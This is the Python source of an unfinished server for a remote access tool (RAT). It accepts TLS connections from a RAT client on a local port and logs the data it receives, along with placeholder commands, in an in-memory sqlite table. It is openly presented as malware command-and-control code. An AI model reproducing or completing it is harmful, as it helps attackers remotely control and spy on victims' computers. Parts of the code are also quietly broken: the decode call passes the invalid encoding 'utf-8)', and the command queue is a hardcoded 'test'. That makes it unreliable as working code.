"""
Python Remote Access Tool(RAT) Server

This server takes in a queue of user commands and gives them to a RAT client to be executed. All traffic is encrypted with TLS.
"""
import datetime
import sqlite3
import socket
import ssl

class SERVER:
    """
    Server object

    Takes in a queue of user commands and gives them to the client upon request to by run by the RAT client.
    
    Attributes:
        host : str
            IP address of the server
        port : int
            Port of the server
    
    Methods:
        make_connection()
            Listen for the client
        make_db()
            Create a sqlite3 database in memory for storing commands and results
        execute()
        TODO
    TODO
    """
    def __init__(self, host, port):
        """
        Initialization function for the server object

        Host and Port can be configured when the object is initialized

        Parameters:
            host : str
                IP address of server
            port : int
                Port of server

        """
        self.host = host
        self.port = port
    
    def make_db(db_file):
        """
        Create a sqlite3 database in memory for storing commands and results
        """
        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared') #If you wanted a local file database instead of in memory you could connect to a local database file like connect(rat_db.db)
        cur = db.cursor()
        cur.execute("DROP TABLE IF EXISTS COMMANDS")
        db.commit()
        cur.execute('''CREATE TABLE COMMANDS(TIME TEXT PRIMARY KEY, COMMAND TEXT, RESULT TEXT);''')
        db.commit()
        print("Table created")
        db.close()
        
    
    def make_connection(self):
        """
        Connect client and server.

        Listens for the client and connects using the TLS certs that are declared as keyfile and certfile. Default certs for testing can be found in the main directory of the project.

        """
        global client, addr, sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock = ssl.wrap_socket(
            sock, server_side=True, keyfile="privkey.pem", certfile="certficate.pem" #If you want to use other cert files, you can change the path to your private key and cert here.
        )

        sock.bind((self.host, self.port))
        sock.listen(0)

    def execute(self):
        while True:
            connection, client_address = sock.accept()
            while True:
                data = connection.recv(1024)
                if not data:
                    break
                print(f"Received: {data.decode('utf-8')}")
                db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
                cur = db.cursor()
                cur.execute("INSERT INTO COMMANDS(TIME, COMMAND, RESULT) VALUES (?, ?, ?)", (str(datetime.datetime.now()), "test", data.decode('utf-8)')))
                db.commit()
                cur.execute("SELECT TIME, COMMAND, RESULT FROM COMMANDS")
                for row in cur:
                    print(f"{row[0]}: {row[1]} -> {row[2]}")
                db.close()

if __name__ == "__main__":

    server = SERVER("127.0.0.1", 4445) #Initialize the server
    server.make_connection() #Listen for the client
    server.make_db()
    server.execute() #Run the rat